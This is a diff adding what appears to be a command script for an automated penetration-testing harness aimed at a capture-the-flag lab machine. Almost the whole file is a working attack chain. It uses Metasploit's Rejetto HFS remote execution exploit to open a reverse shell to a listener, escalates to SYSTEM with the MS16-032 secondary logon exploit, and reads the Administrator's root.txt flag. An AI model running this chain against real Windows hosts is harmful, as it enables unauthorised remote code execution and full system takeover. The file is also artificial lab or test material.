@@ -1,0 +1,19 @@
+set_target 10.129.122.112; exploit/windows/http/rejetto_hfs_exec; set delay_to_observe 1; set rhosts 10.129.122.112; set lhost <LOCAL_IP>; set lport <REVSHELL_PORT>; set SRVPORT <SRV_PORT>; set rport 80; run;
+
+#set delay_to_observe 1; 
+#set rhosts 10.10.10.8; 
+#set lhost <LOCAL_IP>; 
+#set lport <REVSHELL_PORT>; 
+#set SRVPORT <SRV_PORT>
+#run;
+
+#set_game_type PRIVESC;
+
+exploit/windows/local/ms16_032_secondary_logon_handle_privesc; set SESSION <metasploit_session_id>; set DELAY_TO_OBSERVE 30; set lhost <LOCAL_IP>; set lport <REVSHELL_PORT_2>; run;
+
+execute_meterpreter_command_in_session; set command cat C:\\Documents\ and\ Settings\\Administrator\\Desktop\\root.txt; run;
+
+execute_meterpretershell_command_in_session; set command hostname; run;
+execute_meterpretershell_command_in_session; set command dir; run;
+
+#services
